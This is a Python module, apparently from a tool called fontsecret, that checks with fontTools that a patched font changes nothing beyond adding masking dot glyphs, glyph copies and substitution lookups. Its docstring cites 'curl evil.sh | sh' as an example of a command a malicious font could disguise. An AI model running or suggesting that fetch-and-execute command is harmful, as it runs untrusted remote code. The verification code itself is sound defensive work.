"""Check that a patched font differs from its original only by secret masking.

A font controls what text looks like, so a modified font could draw `ls` where the text
says `curl evil.sh | sh`. `verify` proves a fontsecret build can't: compared with the
original it

- keeps every original glyph, its outline bytes and its metrics, and every character's
  glyph (`cmap`) unchanged;
- adds only dot glyphs (all the same outline, inside one cell) and copies of original
  glyphs;
- keeps every original lookup, feature and script unchanged, apart from the masking
  feature fontsecret adds;
- adds lookups that only replace a glyph with a dot or with a copy that draws exactly like
  the glyph it replaces;
- leaves every other table unchanged.

Anything else is a failure, including changes fontsecret itself never makes.
"""

import copy
import io
from dataclasses import dataclass, field

from fontTools.misc.xmlWriter import XMLWriter
from fontTools.pens.boundsPen import BoundsPen
from fontTools.pens.recordingPen import DecomposingRecordingPen
from fontTools.ttLib import TTFont
from fontTools.ttLib.tables import otTables as ot

# Tables fontsecret rewrites. Everything else must be byte-identical.
REWRITTEN = {"glyf", "loca", "CFF ", "hmtx", "vmtx", "gvar", "HVAR", "VVAR", "maxp", "head",
             "post", "GSUB", "name", "OS/2", "cmap", "hhea", "vhea"}
# The only hhea/vhea fields that change: how many glyphs carry their own advance.
METRIC_COUNTS = {"hhea": "numberOfHMetrics", "vhea": "numberOfVMetrics"}
# Optional per-glyph caches fontsecret drops.
DROPPED = {"hdmx", "LTSH", "VDMX"}
HEAD_VOLATILE = {"checkSumAdjustment", "modified"}


@dataclass
class Report:
    errors: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)

    @property
    def ok(self) -> bool:
        return not self.errors

    def fail(self, message: str) -> None:
        self.errors.append(message)


def verify(original: TTFont, patched: TTFont) -> Report:
    report = Report()
    old_order, new_order = original.getGlyphOrder(), patched.getGlyphOrder()
    if new_order[: len(old_order)] != old_order:
        report.fail("original glyph order changed: glyphs were renamed, removed or reordered")
        return report
    added = new_order[len(old_order):]

    _check_tables(original, patched, report)
    _check_original_glyphs(original, patched, old_order, report)
    dots, copies = _classify_added(original, patched, added, report)
    _check_gsub(original, patched, set(added), dots, copies, report)
    report.notes.append(f"{len(added)} glyphs added: {len(dots)} dots, {len(copies)} copies")
    return report


# --- tables ---------------------------------------------------------------------------

def _check_tables(original: TTFont, patched: TTFont, report: Report) -> None:
    old, new = set(original.keys()) - {"GlyphOrder"}, set(patched.keys()) - {"GlyphOrder"}
    for tag in sorted(new - old):
        if tag != "GSUB":
            report.fail(f"table {tag!r} was added")
    for tag in sorted(old - new):
        if tag not in DROPPED:
            report.fail(f"table {tag!r} was removed")
    for tag in sorted(old & new):
        if tag in REWRITTEN or original.reader[tag] == patched.reader[tag]:
            continue
        report.fail(f"table {tag!r} changed")
    # fontTools re-encodes any table it loads, so compare cmap by its mappings, not bytes.
    if "cmap" in old & new and _cmap(original) != _cmap(patched):
        report.fail("cmap changed: some character now maps to a different glyph")
    for tag in ("OS/2", "post"):
        if tag in old & new and _xml(original[tag], original) != _xml(patched[tag], original):
            # post lists glyph names, so a name-bearing post differs by the added names
            if tag == "post" and _post_same(original, patched):
                continue
            report.fail(f"table {tag!r} changed")
    for tag, count in METRIC_COUNTS.items():
        if tag in old & new:
            a, b = original[tag].__dict__, patched[tag].__dict__
            for key in sorted(set(a) | set(b)):
                if key != count and a.get(key) != b.get(key):
                    report.fail(f"{tag}.{key} changed: {a.get(key)!r} -> {b.get(key)!r}")
    if "head" in old:
        a, b = original["head"].__dict__, patched["head"].__dict__
        for key in sorted(set(a) | set(b)):
            if key not in HEAD_VOLATILE and a.get(key) != b.get(key):
                report.fail(f"head.{key} changed: {a.get(key)!r} -> {b.get(key)!r}")
    if "name" in old:
        before = {(r.nameID, r.platformID, r.langID): r.toUnicode() for r in original["name"].names}
        after = {(r.nameID, r.platformID, r.langID): r.toUnicode() for r in patched["name"].names}
        changed = sorted({k[0] for k in set(before) | set(after) if before.get(k) != after.get(k)})
        if changed:
            report.notes.append(f"name IDs changed (renamed family): {changed}")


def _cmap(font: TTFont) -> dict:
    out = {}
    for t in font["cmap"].tables:
        key = (t.platformID, t.platEncID, t.format)
        out[key] = getattr(t, "uvsDict", None) if t.format == 14 else dict(t.cmap)
    return out


def _post_same(original: TTFont, patched: TTFont) -> bool:
    a, b = original["post"].__dict__, patched["post"].__dict__
    skip = {"extraNames", "mapping", "glyphOrder"}
    return all(a.get(k) == b.get(k) for k in set(a) | set(b) if k not in skip)


# --- glyphs ---------------------------------------------------------------------------

def _glyph_bytes(font: TTFont, name: str) -> bytes:
    if "glyf" in font:
        glyf = font["glyf"]
        g = glyf.glyphs[name]
        return g.data if hasattr(g, "data") else g.compile(glyf)
    cs = font["CFF "].cff.topDictIndex[0].CharStrings[name]
    if cs.bytecode is None:
        cs.compile()
    return cs.bytecode


def _outline(font: TTFont, name: str) -> tuple:
    glyphs = font.getGlyphSet()
    pen = DecomposingRecordingPen(glyphs)
    glyphs[name].draw(pen)
    return tuple(pen.value), glyphs[name].width


def _check_original_glyphs(original: TTFont, patched: TTFont, names: list[str], report: Report) -> None:
    for metrics in ("hmtx", "vmtx"):
        if metrics in original:
            moved = [n for n in names if original[metrics][n] != patched[metrics][n]]
            if moved:
                report.fail(f"{metrics} changed for {len(moved)} original glyphs, e.g. {moved[:3]}")
    changed = [n for n in names if _glyph_bytes(original, n) != _glyph_bytes(patched, n)]
    if changed:
        report.fail(f"{len(changed)} original glyph outlines changed, e.g. {changed[:5]}")
    if "gvar" in original:
        old, new = original["gvar"].variations, patched["gvar"].variations
        varied = [n for n in names if _xml_list(old.get(n, [])) != _xml_list(new.get(n, []))]
        if varied:
            report.fail(f"variation data changed for {len(varied)} original glyphs, e.g. {varied[:3]}")


def _classify_added(original: TTFont, patched: TTFont, added: list[str], report: Report):
    """Split added glyphs into dots and copies. A copy draws exactly like an original
    glyph; every dot draws the same outline inside one cell."""
    original_outlines = {_outline(original, n) for n in original.getGlyphOrder()}
    copies: dict[str, tuple] = {}
    others: dict[str, tuple] = {}
    for name in added:
        outline = _outline(patched, name)
        (copies if outline in original_outlines else others)[name] = outline
    if len(set(others.values())) > 1:
        report.fail(f"added glyphs draw {len(set(others.values()))} different new shapes, "
                    f"expected one dot: {sorted(others)[:5]}")
    cell = _cell_width(original)
    glyphs = patched.getGlyphSet()
    for name, (_, width) in others.items():
        pen = BoundsPen(glyphs)
        glyphs[name].draw(pen)
        bounds = pen.bounds
        if width != cell or bounds is None or bounds[0] < 0 or bounds[2] > cell:
            report.fail(f"added glyph {name!r} is not a dot inside one cell (width {width}, bounds {bounds})")
    return set(others), copies


def _cell_width(font: TTFont) -> int:
    return font["hmtx"][font.getBestCmap()[ord("0")]][0]


# --- layout ---------------------------------------------------------------------------

def _check_gsub(original: TTFont, patched: TTFont, added: set[str], dots: set[str],
                copies: dict[str, tuple], report: Report) -> None:
    old = original["GSUB"].table if "GSUB" in original else None
    new = patched["GSUB"].table if "GSUB" in patched else None
    if new is None:
        if old is not None:
            report.fail("GSUB was removed")
        return
    old_lookups = old.LookupList.Lookup if old is not None and old.LookupList else []
    new_lookups = new.LookupList.Lookup
    shift = len(new_lookups) - len(old_lookups)
    if shift < 0:
        report.fail("GSUB has fewer lookups than the original")
        return

    # Original lookups: unchanged, moved up by `shift`, never calling an added lookup.
    for i, lookup in enumerate(old_lookups):
        moved = copy.deepcopy(new_lookups[i + shift])
        for record in _nested_records(moved):
            record.LookupListIndex -= shift
            if record.LookupListIndex < 0:
                report.fail(f"original lookup {i} now calls an added lookup")
        if _lookup_xml(moved, patched) != _lookup_xml(lookup, original):
            report.fail(f"original lookup {i} changed")

    # Added lookups: chains that only call added single substitutions into dots or copies.
    outlines = {}
    for i, lookup in enumerate(new_lookups[:shift]):
        for st in lookup.SubTable:
            kind, st = _unwrap(lookup, st)
            if kind == 6:
                for record in _nested_records(st):
                    if record.LookupListIndex >= shift:
                        report.fail(f"added lookup {i} calls original lookup {record.LookupListIndex - shift}")
            elif kind == 1:
                for src, dst in st.mapping.items():
                    if dst not in added:
                        report.fail(f"added lookup {i} replaces {src!r} with original glyph {dst!r}")
                    elif dst in dots:
                        continue
                    else:
                        if src not in outlines:
                            outlines[src] = _outline(patched, src)
                        if copies.get(dst) != outlines[src]:
                            report.fail(f"added lookup {i} replaces {src!r} with {dst!r}, which draws differently")
                        elif "gvar" in patched:
                            var = patched["gvar"].variations
                            if _xml_list(var.get(src, [])) != _xml_list(var.get(dst, [])):
                                report.fail(f"added lookup {i} replaces {src!r} with {dst!r}, which varies differently")
            else:
                report.fail(f"added lookup {i} is type {kind}; only chained (6) and single (1) are allowed")

    _check_features(old, new, shift, report)


def _check_features(old, new, shift: int, report: Report) -> None:
    def records(table):
        return table.FeatureList.FeatureRecord if table is not None and table.FeatureList else []

    def scripts(table):
        out = {}
        if table is None or table.ScriptList is None:
            return out
        for s in table.ScriptList.ScriptRecord:
            systems = [("dflt", s.Script.DefaultLangSys)] if s.Script.DefaultLangSys else []
            systems += [(l.LangSysTag, l.LangSys) for l in s.Script.LangSysRecord]
            for lang, ls in systems:
                out[(s.ScriptTag, lang)] = ls
        return out

    old_records, new_records = records(old), records(new)

    def resolved(table_records, ls, drop_added: bool) -> dict[str, list[int]]:
        out: dict[str, list[int]] = {}
        for index in ls.FeatureIndex:
            r = table_records[index]
            lookups = [i - shift for i in r.Feature.LookupListIndex if i >= shift] if drop_added \
                else list(r.Feature.LookupListIndex)
            out.setdefault(r.FeatureTag, []).extend(lookups)
        return {k: v for k, v in out.items() if v}

    old_scripts, new_scripts = scripts(old), scripts(new)
    for key, ls in old_scripts.items():
        if key not in new_scripts:
            report.fail(f"script/language {key} was removed")
            continue
        before = resolved(old_records, ls, drop_added=False)
        after = resolved(new_records, new_scripts[key], drop_added=True)
        if before != after:
            report.fail(f"features of {key} changed")
    for key in new_scripts.keys() - old_scripts.keys():
        if resolved(new_records, new_scripts[key], drop_added=True):
            report.fail(f"added script/language {key} applies original lookups")
    old_fv, new_fv = getattr(old, "FeatureVariations", None), getattr(new, "FeatureVariations", None)
    if (old_fv is None) != (new_fv is None):
        report.fail("FeatureVariations added or removed")
    elif old_fv is not None:
        def subs(fv, recs, drop):
            out = []
            for rec in fv.FeatureVariationRecord:
                for s in rec.FeatureTableSubstitution.SubstitutionRecord:
                    lookups = [i - shift for i in s.Feature.LookupListIndex if i >= shift] if drop \
                        else list(s.Feature.LookupListIndex)
                    out.append((recs[s.FeatureIndex].FeatureTag, lookups))
            return sorted(out)
        if subs(old_fv, old_records, False) != subs(new_fv, new_records, True):
            report.fail("FeatureVariations changed")


def _unwrap(lookup, subtable):
    if lookup.LookupType == 7:
        return subtable.ExtSubTable.LookupType, subtable.ExtSubTable
    return lookup.LookupType, subtable


def _nested_records(node, seen=None):
    seen = set() if seen is None else seen
    if id(node) in seen:
        return
    seen.add(id(node))
    if isinstance(node, ot.SubstLookupRecord):
        yield node
    elif isinstance(node, list):
        for item in node:
            yield from _nested_records(item, seen)
    elif isinstance(node, ot.BaseTable):
        for value in vars(node).values():
            if isinstance(value, (list, ot.BaseTable)):
                yield from _nested_records(value, seen)


def _lookup_xml(lookup, font: TTFont) -> str:
    """A lookup's content, ignoring whether it is wrapped in Extension subtables."""
    flat = ot.Lookup()
    flat.LookupFlag = lookup.LookupFlag
    flat.SubTable = []
    for st in lookup.SubTable:
        kind, inner = _unwrap(lookup, st)
        flat.LookupType = kind
        flat.SubTable.append(inner)
    flat.SubTableCount = len(flat.SubTable)
    if hasattr(lookup, "MarkFilteringSet"):
        flat.MarkFilteringSet = lookup.MarkFilteringSet
    return _xml(flat, font)


def _xml(obj, font: TTFont) -> str:
    buf = io.StringIO()
    writer = XMLWriter(buf)
    obj.toXML(writer, font)
    return buf.getvalue()


def _xml_list(items) -> str:
    return repr([(v.axes, v.coordinates) for v in items])
